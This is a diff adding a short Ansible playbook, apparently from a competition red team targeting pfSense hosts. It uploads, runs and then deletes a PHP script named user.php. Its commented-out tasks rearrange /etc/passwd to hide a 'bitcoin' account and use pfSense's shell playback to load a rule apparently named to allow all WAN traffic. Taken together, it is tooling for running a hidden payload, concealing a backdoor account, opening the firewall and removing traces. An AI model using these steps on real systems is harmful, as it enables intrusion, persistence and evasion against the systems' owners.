@@ -1,0 +1,30 @@
+---
+
+- name: upload user.php
+  copy:
+      src: user.php
+      dest: /tmp/user.php
+
+- name: run user.php
+  raw: php /tmp/user.php
+
+- name: remove user.php
+  file:
+      path: /tmp/user.php
+      state: absent  
+
+# - name: install vim
+#   shell: pkg install -y vim-console-8.1.1954
+
+# - name: move blackteam to the middle
+#   shell: vim -c 'g/^bitcoin/$m 16' -cwq /etc/passwd 
+
+
+# - name: Teaffany says hi
+#   copy: 
+#       src: enableallowallwan
+#       dest: /etc/phpshellsessions/Teaffany
+
+# - name: run Teaffany says hi rule 
+#   shell: cd /etc; pfSsh.php playback /etc/phpshellsessions/Teaffany
+
